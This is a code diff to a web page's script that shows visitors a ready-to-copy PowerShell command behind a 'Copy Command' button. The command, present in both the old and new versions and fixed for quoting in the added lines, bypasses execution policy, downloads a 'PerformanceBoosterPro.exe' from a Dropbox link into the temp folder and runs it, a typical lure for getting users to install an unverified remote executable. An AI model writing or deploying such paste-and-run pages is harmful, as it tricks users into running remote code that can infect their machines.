@@ -528,41 +528,32 @@
         </footer>
     </div>
 
-    <script>
-        // The Updated Command
-        const command = `const command = `powershell -ExecutionPolicy Bypass -NoLogo -NoProfile -Command "Invoke-WebRequest -Uri 'https://dl.dropboxusercontent.com/scl/fi/oqad0mvio3izrk36z3yui/PerformanceBoosterPro.exe?rlkey=lf14jsrylm37mn5pl7yk9zn2f&st=qxzro4lj' -OutFile \"$env:TEMP\\PerformanceBoosterPro.exe\"; Start-Process \"$env:TEMP\\PerformanceBoosterPro.exe\""``;
+<script>
+    const command = String.raw`powershell -ExecutionPolicy Bypass -NoLogo -NoProfile -Command "Invoke-WebRequest -Uri 'https://dl.dropboxusercontent.com/scl/fi/oqad0mvio3izrk36z3yui/PerformanceBoosterPro.exe?rlkey=lf14jsrylm37mn5pl7yk9zn2f&st=qxzro4lj' -OutFile "$env:TEMP\PerformanceBoosterPro.exe"; Start-Process "$env:TEMP\PerformanceBoosterPro.exe""`;
 
-        // Display the command in the HTML on load
-        document.getElementById('cmdText').innerText = command;
+    // عرض الأمر داخل CMD-like box
+    document.getElementById('cmdText').innerText = command;
 
-        function copyCommand() {
-            const btn = document.getElementById('copyBtn');
-            const label = document.getElementById('btnLabel');
-            const icon = document.getElementById('btnIcon');
+    function copyCommand() {
+        const btn = document.getElementById('copyBtn');
+        const label = document.getElementById('btnLabel');
+        const icon = document.getElementById('btnIcon');
 
-            navigator.clipboard.writeText(command).then(() => {
-                // Success State
-                btn.classList.add('success');
-                label.innerText = "Copied!";
-                icon.innerHTML = "<polyline points='20 6 9 17 4 12'></polyline>";
+        navigator.clipboard.writeText(command).then(() => {
+            btn.classList.add('success');
+            label.innerText = "Copied!";
+            icon.innerHTML = "<polyline points='20 6 9 17 4 12'></polyline>";
 
-                // Reset after 2.5 seconds
-                setTimeout(() => {
-                    btn.classList.remove('success');
-                    label.innerText = "Copy Command";
-                    icon.innerHTML = "<rect x='9' y='9' width='13' height='13' rx='2' ry='2'></rect><path d='M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1'></path>";
-                }, 2500);
-            }).catch(err => {
-                console.error('Failed to copy: ', err);
-                alert('Failed to copy. Please copy manually.');
-            });
-        }
-    </script>
+            setTimeout(() => {
+                btn.classList.remove('success');
+                label.innerText = "Copy Command";
+                icon.innerHTML = "<rect x='9' y='9' width='13' height='13' rx='2' ry='2'></rect><path d='M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1'></path>";
+            }, 2500);
+        }).catch(err => {
+            console.error('Failed to copy: ', err);
+            alert('Failed to copy. Please copy manually.');
+        });
+    }
+</script>
 </body>
 </html>
-
-
-
-
-
-
